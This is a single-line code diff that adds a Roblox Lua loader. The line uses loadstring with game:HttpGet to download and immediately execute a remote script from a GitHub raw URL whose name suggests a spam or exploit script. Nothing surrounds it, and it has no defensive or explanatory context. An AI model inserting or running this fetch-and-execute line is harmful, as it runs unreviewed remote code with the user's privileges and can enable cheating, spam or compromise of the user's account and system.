@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/update-x-cvr-retro-spam3-jsdlwljvo43erh.lua"))()
